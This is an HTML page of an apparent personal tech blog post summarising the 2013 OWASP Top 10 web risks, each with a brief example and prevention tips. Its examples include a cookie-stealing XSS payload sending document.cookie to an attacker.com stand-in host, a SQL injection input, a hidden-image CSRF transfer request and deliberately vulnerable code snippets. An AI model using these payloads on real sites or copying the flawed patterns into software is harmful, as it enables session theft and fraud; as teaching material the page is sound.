@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>Security: Owasp Top 10 - Binwei's Blog</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../../css/brands.min.css" rel="stylesheet">
+        <link href="../../css/solid.min.css" rel="stylesheet">
+        <link href="../../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../..">Binwei's Blog</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../.." class="nav-link">Welcome to Binwei's Blog</a>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle active" aria-current="page" role="button" data-bs-toggle="dropdown"  aria-expanded="false">2017</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../authenticate_by_openidconnect/" class="dropdown-item">Authenticate Node.js App by OpenId Connect</a>
+</li>
+                                    
+<li>
+    <a href="../bash_useful_commands/" class="dropdown-item">How to Become an Outlier</a>
+</li>
+                                    
+<li>
+    <a href="../become_outlier/" class="dropdown-item">How to Become an Outlier</a>
+</li>
+                                    
+<li>
+    <a href="../blockchain_introduction/" class="dropdown-item">Blockchain Introduction</a>
+</li>
+                                    
+<li>
+    <a href="../book-bian_zhi_lin_shi_xuan/" class="dropdown-item">Book notes: Bian Zhi Lin Anthology</a>
+</li>
+                                    
+<li>
+    <a href="../book-cai_gen_tan/" class="dropdown-item">Book Notes: Cai Gen Tan</a>
+</li>
+                                    
+<li>
+    <a href="../cloud_for_dummy/" class="dropdown-item">Cloud for Dummy</a>
+</li>
+                                    
+<li>
+    <a href="../devops_and_continuous_delivery/" class="dropdown-item">DevOps and Continuous Delivery</a>
+</li>
+                                    
+<li>
+    <a href="../domain_driven_design_introduction/" class="dropdown-item">Domain Driven Design: Introduction</a>
+</li>
+                                    
+<li>
+    <a href="../git_areas/" class="dropdown-item">Git: Areas</a>
+</li>
+                                    
+<li>
+    <a href="../git_branch-basic/" class="dropdown-item">Git: Branch Basic</a>
+</li>
+                                    
+<li>
+    <a href="../git_branch-continued/" class="dropdown-item">Git: Branch Continue</a>
+</li>
+                                    
+<li>
+    <a href="../git_getting-started/" class="dropdown-item">Git: Getting Started</a>
+</li>
+                                    
+<li>
+    <a href="../git_resolve-conflicts/" class="dropdown-item">Git: Resolve Conflicts</a>
+</li>
+                                    
+<li>
+    <a href="../how_to_read_books/" class="dropdown-item">How to Read Books</a>
+</li>
+                                    
+<li>
+    <a href="../introduction_to_javascript/" class="dropdown-item">Introduction to Javascript</a>
+</li>
+                                    
+<li>
+    <a href="../job_security/" class="dropdown-item">Job Security</a>
+</li>
+                                    
+<li>
+    <a href="../kotter_binwei_change_model/" class="dropdown-item">Kotter-Binwei Change Model</a>
+</li>
+                                    
+<li>
+    <a href="../lean_principles/" class="dropdown-item">Lean: Principles</a>
+</li>
+                                    
+<li>
+    <a href="../lean_toolkit_for_software_development/" class="dropdown-item">Lean Toolkit for Software Development</a>
+</li>
+                                    
+<li>
+    <a href="../nosql_introduction/" class="dropdown-item">NoSQL: Introduction</a>
+</li>
+                                    
+<li>
+    <a href="./" class="dropdown-item active" aria-current="page">Security: Owasp Top 10</a>
+</li>
+                                    
+<li>
+    <a href="../setup-blog_using-sphinx-ablog/" class="dropdown-item">Setup Blog: Using Sphinx and Ablog</a>
+</li>
+                                    
+<li>
+    <a href="../specification_by_example/" class="dropdown-item">Specification by Example</a>
+</li>
+                                    
+<li>
+    <a href="../technology_to_learn_next/" class="dropdown-item">Technology to Learn Next</a>
+</li>
+                                    
+<li>
+    <a href="../telemetry_overview/" class="dropdown-item">Telemetry: Overview</a>
+</li>
+                                    
+<li>
+    <a href="../the_art_of_simplicity/" class="dropdown-item">The Art of Simplicity</a>
+</li>
+                                    
+<li>
+    <a href="../the_effective_executive/" class="dropdown-item">The Effective Executive</a>
+</li>
+                                    
+<li>
+    <a href="../the_mckinsey_engagement/" class="dropdown-item">The Mckinsey Engagement</a>
+</li>
+                                    
+<li>
+    <a href="../the_mythical_deadline_of_peopleware_man_month/" class="dropdown-item">The Mythical Deadline of Peopleware Man-month</a>
+</li>
+                                    
+<li>
+    <a href="../threat_modeling_introduction/" class="dropdown-item">Threat Modeling: Introduction</a>
+</li>
+                                    
+<li>
+    <a href="../vi_configuration-example/" class="dropdown-item">Vi: Configuration Example</a>
+</li>
+                                    
+<li>
+    <a href="../work_in_big_company/" class="dropdown-item">Work in Big Company</a>
+</li>
+                                    
+<li>
+    <a href="../xunit_test_patterns/" class="dropdown-item">Xunit Test Patterns</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">2018</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../2018/ai_for_smartcities/" class="dropdown-item">AI for Smart Cities</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/authentication_authorization_explainations/" class="dropdown-item">Authentication &amp; Authorization Basic</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/blockchain_scenario/" class="dropdown-item">Blockchain Scenario</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/career_advice/" class="dropdown-item">职场菜根谭</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/cryptography_introduction/" class="dropdown-item">Cryptography Introduction (with .NET code example)</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/docker_introduction/" class="dropdown-item">Docker Introduction</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/https/" class="dropdown-item">Https Explainations</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/microservices_introduction/" class="dropdown-item">Microservices Introduction</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/nodejs_basics/" class="dropdown-item">Node.js Basics</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/personal_branding/" class="dropdown-item">Personal Branding</a>
+</li>
+                                    
+<li>
+    <a href="../../2018/the_personal_mba/" class="dropdown-item">The Personal MBA</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">2019</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../2019/agile_selling/" class="dropdown-item">Agile Selling</a>
+</li>
+                                    
+<li>
+    <a href="../../2019/application_insight_introduction/" class="dropdown-item">Application Insight Introduction</a>
+</li>
+                                    
+<li>
+    <a href="../../2019/azure_datalake_warehouse/" class="dropdown-item">Azure Data Lake and Warehouse</a>
+</li>
+                                    
+<li>
+    <a href="../../2019/azure_security/" class="dropdown-item">Azure Security</a>
+</li>
+                                    
+<li>
+    <a href="../../2019/cyber_security_for_blockchain/" class="dropdown-item">Cyber Security for Blockchain</a>
+</li>
+                                    
+<li>
+    <a href="../../2019/iot_for_smartcities/" class="dropdown-item">Iot for Smart Cities</a>
+</li>
+                                    
+<li>
+    <a href="../../2019/machine_learning_basic/" class="dropdown-item">Machine Learning Basic</a>
+</li>
+                                    
+<li>
+    <a href="../../2019/user_story_applied/" class="dropdown-item">User Story Applied</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">2020</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../2020/about_consulting/" class="dropdown-item">About Consulting</a>
+</li>
+                                    
+<li>
+    <a href="../../2020/arduino_introduction/" class="dropdown-item">Arduino Introduction</a>
+</li>
+                                    
+<li>
+    <a href="../../2020/azure_design_pattern/" class="dropdown-item">Azure Design Pattern</a>
+</li>
+                                    
+<li>
+    <a href="../../2020/china_70_anniversary_bigdata/" class="dropdown-item">China 70 Anniversary Big Data</a>
+</li>
+                                    
+<li>
+    <a href="../../2020/data_science_basic/" class="dropdown-item">Data Science Basic</a>
+</li>
+                                    
+<li>
+    <a href="../../2020/enlightenment_from_singing/" class="dropdown-item">Enlightenment from Singing</a>
+</li>
+                                    
+<li>
+    <a href="../../2020/intelligent_web_sentences/" class="dropdown-item">Intelligent Web Sentences</a>
+</li>
+                                    
+<li>
+    <a href="../../2020/mac_tips/" class="dropdown-item">Mac Tips</a>
+</li>
+                                    
+<li>
+    <a href="../../2020/xiao_gou_qian_qian/" class="dropdown-item">Book note: Xiao Gou Qian Qian</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">2021</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../2021/measure_anything/" class="dropdown-item">Measure Anything</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../nosql_introduction/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../setup-blog_using-sphinx-ablog/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#security-owasp-top-10" class="nav-link">Security: Owasp Top 10</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#table-of-contents" class="nav-link">Table of Contents</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#1-injection" class="nav-link">1. Injection</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#2-broken-authentication-and-session-management" class="nav-link">2. Broken authentication and session management</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example_1" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent_1" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#3-cross-site-scripting-xss" class="nav-link">3. Cross-site scripting (XSS)</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example_2" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent_2" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#4-insecure-direct-object-references" class="nav-link">4. Insecure direct object references</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example_3" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent_3" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#5-security-misconfiguration" class="nav-link">5. Security misconfiguration</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example_4" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent_4" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#6-sensitive-data-exposure" class="nav-link">6. Sensitive data exposure</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example_5" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent_5" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#7-missing-function-level-access-control" class="nav-link">7. Missing function level access control</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example_6" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent_6" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#8-cross-site-request-forgery-csrf" class="nav-link">8. Cross-site request forgery (CSRF)</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example_7" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent_7" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#9-using-components-with-known-vulnerabilities" class="nav-link">9. Using components with known vulnerabilities</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#10-unvalidated-redirects-and-forwards" class="nav-link">10. Unvalidated redirects and forwards</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#example_8" class="nav-link">Example</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#how-to-prevent_8" class="nav-link">How to prevent</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-bs-level="1"><a href="#references" class="nav-link">References</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="security-owasp-top-10">Security: Owasp Top 10</h1>
+<p><strong>Published:</strong> Jul 05, 2017
+<strong>Tags:</strong> security
+<strong>Category:</strong> ComputerScience</p>
+<p>The <a href="https://www.owasp.org">Open Web Application Security Project (OWASP) </a> is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted.
+The goal of the Top 10 project is to raise awareness about application security by identifying some of the most critical risks facing organizations.
+This blog is based on 2013 version, while 2017 version will come very soon.</p>
+<h2 id="table-of-contents">Table of Contents</h2>
+<h1 id="1-injection">1. Injection</h1>
+<p>Injection has many types:</p>
+<ul>
+<li>SQL injection</li>
+<li>NoSQL injection</li>
+<li>Command injection</li>
+<li>Code injection</li>
+<li>Path traversal</li>
+<li>ORM injection</li>
+<li>XML injection</li>
+<li>XPath injection</li>
+</ul>
+<h2 id="example">Example</h2>
+<p>A web server makes a query string like the following:</p>
+<pre><code class="language-c">String query = &quot;SELECT * FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;;
+</code></pre>
+<p>The attacker modifies the ‘id’ parameter value in her browser to send: ' or '1'='1.</p>
+<h2 id="how-to-prevent">How to prevent</h2>
+<ul>
+<li>White-list (untrusted data): What input do we trust? Does it adhere to expected pattern?</li>
+<li>Use safe API which provides parameterized interface</li>
+<li>Escape special character</li>
+<li>Positive or 'white list' input validation</li>
+</ul>
+<h1 id="2-broken-authentication-and-session-management">2. Broken authentication and session management</h1>
+<p>It means session management assets like user credentials and session IDs are not properly protected.</p>
+<h2 id="example_1">Example</h2>
+<p>If a web site put the token into the query string:</p>
+<p>http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii</p>
+<p>Then if the user share the link with others, the token/session id will be used by others.</p>
+<p>There are other ways to hack the authentication and session management system.</p>
+<p>Auth cookie theft:</p>
+<ul>
+<li>Exploit an XSS risk</li>
+<li>Retrieve it from the victim's PC</li>
+<li>Sniff it over an insecure connection</li>
+</ul>
+<p>Account management attack:</p>
+<ul>
+<li>Brute force the login</li>
+<li>Exploit password reset</li>
+<li>Discover weak credentials</li>
+</ul>
+<p>Session ID theft:</p>
+<ul>
+<li>Copy and paste a URL with it</li>
+<li>Send it via an insecure email</li>
+<li>Retrieve it from a log</li>
+</ul>
+<h2 id="how-to-prevent_1">How to prevent</h2>
+<p>Protect the cookies:</p>
+<ul>
+<li>Use the HttpOnly flag (HttpOnly is an additional flag included in a Set-Cookie HTTP response header, If the HttpOnly flag (optional) is included in the HTTP response header, the cookie cannot be accessed through client side script)</li>
+<li>Make sure they're flagged as 'secure'</li>
+</ul>
+<p>Decrease the window of risk:</p>
+<ul>
+<li>Expire sessions quickly</li>
+<li>Re-challenge the user on key actions</li>
+</ul>
+<p>Other ways:</p>
+<ul>
+<li>Authentication must be over TLS</li>
+<li>Passwords policy</li>
+<li>"Secure" error messages</li>
+<li>Multiple-factor authentication</li>
+<li>CAPTCHA</li>
+<li>Block accounts</li>
+<li>Restore passwords</li>
+<li>No session identifier in URL</li>
+<li>Use TLS</li>
+<li>Logout</li>
+<li>Close browser window</li>
+<li>Secure passwords storage: Do not forget salt; SHA-256, SHA-512; PBKDF2, bcrypt, scrypt</li>
+</ul>
+<h1 id="3-cross-site-scripting-xss">3. Cross-site scripting (XSS)</h1>
+<p>XSS has the following types:</p>
+<ul>
+<li>Stored XSS</li>
+<li>Reflected XSS</li>
+<li>DOM Based XSS</li>
+</ul>
+<h2 id="example_2">Example</h2>
+<p>If the web server generate the content by using following code:</p>
+<pre><code class="language-c">(String) page += &quot;&lt;input name='creditcard' type='TEXT' value='&quot; + request.getParameter(&quot;CC&quot;) + &quot;'&gt;&quot;;
+</code></pre>
+<p>The attacker modifies the ‘CC’ parameter in his browser to:</p>
+<pre><code class="language-html">'&gt;&lt;script&gt;document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie&lt;/script&gt;'.
+</code></pre>
+<p>This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.</p>
+<h2 id="how-to-prevent_2">How to prevent</h2>
+<ul>
+<li>Validation: Xxs-filters; Secure-filters; Xss; Validator-js</li>
+<li>HttpOnly cookies</li>
+<li>Helmet-csp (Content Security Policy)</li>
+</ul>
+<h1 id="4-insecure-direct-object-references">4. Insecure direct object references</h1>
+<p>Insecure direct object reference has the vulnerability to let the hacker get to know the internal system design.</p>
+<h2 id="example_3">Example</h2>
+<p>If the web server has the following code:</p>
+<pre><code class="language-c">var messageId = req.params.messageId;
+messagesDAO.getById(messageId, function(error, message)
+{
+    return res.render(&quot;message&quot;, message);
+}
+</code></pre>
+<p>The hacker can use:
+http://site.com/view-message?messageId=1</p>
+<h2 id="how-to-prevent_3">How to prevent</h2>
+<ul>
+<li>Use per user or session indirect object references.</li>
+<li>Check permissions on all application's layers</li>
+<li>Testing &amp; Code review</li>
+</ul>
+<h1 id="5-security-misconfiguration">5. Security misconfiguration</h1>
+<h2 id="example_4">Example</h2>
+<p>The app server admin console is automatically installed and not removed.
+Default accounts aren’t changed.
+Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.</p>
+<h2 id="how-to-prevent_4">How to prevent</h2>
+<p>Use following tools:</p>
+<ul>
+<li>Ansible, chef, puppet</li>
+<li>Helmet</li>
+<li>Hpp</li>
+<li>Cors</li>
+<li>Node-ipgeoblock</li>
+<li>Express-limiter</li>
+<li>Safe-regex</li>
+</ul>
+<h1 id="6-sensitive-data-exposure">6. Sensitive data exposure</h1>
+<p>Relevant types:</p>
+<ul>
+<li>Sniffing</li>
+<li>Insecure cryptographic storage</li>
+</ul>
+<h2 id="example_5">Example</h2>
+<p>The password database uses unsalted hashes to store everyone’s passwords.
+A file upload flaw allows an attacker to retrieve the password file.
+All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.</p>
+<p>Insufficient use of SSL</p>
+<ul>
+<li>login not loaded over HTTPS</li>
+<li>Mixed mode</li>
+<li>Cookies not sent securely</li>
+</ul>
+<p>Bad crypto</p>
+<ul>
+<li>Incorrect password storage</li>
+<li>Poor protection of keys</li>
+<li>Weak algorithm chosen</li>
+</ul>
+<p>Other exposure risks</p>
+<ul>
+<li>Browser auto-complete</li>
+<li>Leaked via logs</li>
+<li>Disclosure via URL</li>
+</ul>
+<h2 id="how-to-prevent_5">How to prevent</h2>
+<ul>
+<li>Always use TLS (TLS 1.1 and TSL 1.2)</li>
+<li>Secured control only over HTTPS</li>
+<li>HTTP content in HTTPS pages</li>
+<li>Use cookie's Secure attribute</li>
+<li>Minimize sensitive data collection</li>
+<li>Use strong crypto storage</li>
+</ul>
+<p>Use Javascript Cryptography:</p>
+<ul>
+<li>Crypto</li>
+<li>Sjcl (Stanford)</li>
+<li>Crypto-js</li>
+<li>Node-forge</li>
+<li>Web Cryptography API</li>
+<li>PolyCrypt</li>
+</ul>
+<h1 id="7-missing-function-level-access-control">7. Missing function level access control</h1>
+<p>Relevant types:</p>
+<ul>
+<li>Security through obscurity</li>
+<li>Checking permissions only in UI</li>
+<li>Missing permissions check in helper services</li>
+</ul>
+<p>Relevant questions:</p>
+<ul>
+<li>Does the UI show navigation to unauthorised functions?</li>
+<li>Are server side authentication or authorization checks missing?</li>
+<li>Are server side checks done that solely rely on information provided by the attacker?</li>
+<li>Are system or diagnostic resources accessible without proper authorisation?</li>
+<li>Will "force browsing" disclosure unsecured resources?</li>
+</ul>
+<h2 id="example_6">Example</h2>
+<p>Attacker uses automated tool like OWASP ZAP or SQLMap to detect vulnerabilities and possibly exploit them.</p>
+<h2 id="how-to-prevent_6">How to prevent</h2>
+<ul>
+<li>Check permission on all application's layer</li>
+<li>Authentication middleware</li>
+<li>Testing &amp; Code review</li>
+<li>Define a clear authorisation model</li>
+<li>Check for forced browsing</li>
+<li>Always test unprivileged roles</li>
+</ul>
+<h1 id="8-cross-site-request-forgery-csrf">8. Cross-site request forgery (CSRF)</h1>
+<p>CSRF indicates token vulnerability.</p>
+<h2 id="example_7">Example</h2>
+<p>The application allows a user to submit a state changing request that does not include anything secret.</p>
+<p>For example:</p>
+<pre><code class="language-c">http://example.com/app/transferFunds?amount=1500 &amp;destinationAccount=4673243243
+</code></pre>
+<p>So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:</p>
+<pre><code class="language-c">&lt;img src=&quot;http://example.com/app/transferFunds? amount=1500&amp;destinationAccount=attackersAcct#“ width=&quot;0&quot; height=&quot;0&quot; /&gt;
+</code></pre>
+<p>If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.</p>
+<p>BTW, iframe means inline frame is used to embed another document within the current HTML document.</p>
+<h2 id="how-to-prevent_7">How to prevent</h2>
+<ul>
+<li>Include the unique token in a hidden field. This includes the value in the body of the HTTP request, avoiding its exposure in the URL.</li>
+<li>Employ anti-forgery tokens</li>
+<li>Validate the referrer</li>
+<li>Use csurf</li>
+</ul>
+<h1 id="9-using-components-with-known-vulnerabilities">9. Using components with known vulnerabilities</h1>
+<p>If you build your app by using 3rd party components, the know vulnerabilities of the components impact you.
+See following links:</p>
+<ul>
+<li>https://nodesecurity.io</li>
+<li>https://snyk.io</li>
+<li>http://cve.mitre.org</li>
+<li>https://nvd.nist.gov</li>
+<li>https://www.exploit-db.com</li>
+<li>https://www.cvedetails.com</li>
+</ul>
+<h1 id="10-unvalidated-redirects-and-forwards">10. Unvalidated redirects and forwards</h1>
+<p>Unvalidated url redirects and forwards may also cause problems.</p>
+<h2 id="example_8">Example</h2>
+<p>Let's say if your web site contains following code:</p>
+<pre><code class="language-c">app.get(&quot;/login&quot;, function(req, res, next) {
+    return res.redirect(req.query.url);
+});
+</code></pre>
+<p>http://site.com/login?url=/admin</p>
+<p>Hacker can provide a url which looks exactly the same as the original web page which asks for user name/password.</p>
+<h2 id="how-to-prevent_8">How to prevent</h2>
+<ul>
+<li>Use a URL whitelist</li>
+<li>Use indirect references</li>
+<li>Check the referrer</li>
+<li>Do not use redirects</li>
+<li>Do not use parameters to create redirect link</li>
+<li>Validate destination parameter: valid-url</li>
+</ul>
+<h1 id="references">References</h1>
+<p>Other valuable references to look:</p>
+<ul>
+<li>https://github.com/OWASP/NodeGoat</li>
+<li>https://github.com/cr0hn/vulnerable-node</li>
+<li>https://github.com/clarkio/vulnerable-app</li>
+<li>https://github.com/toolness/security-adventure</li>
+<li>https://github.com/bkimminich/juice-shop</li>
+<li>https://www.owasp.org/index.php/</li>
+</ul>
+<p><em>Written by Binwei@Oslo</em></p></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js"></script>
+        <script src="../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
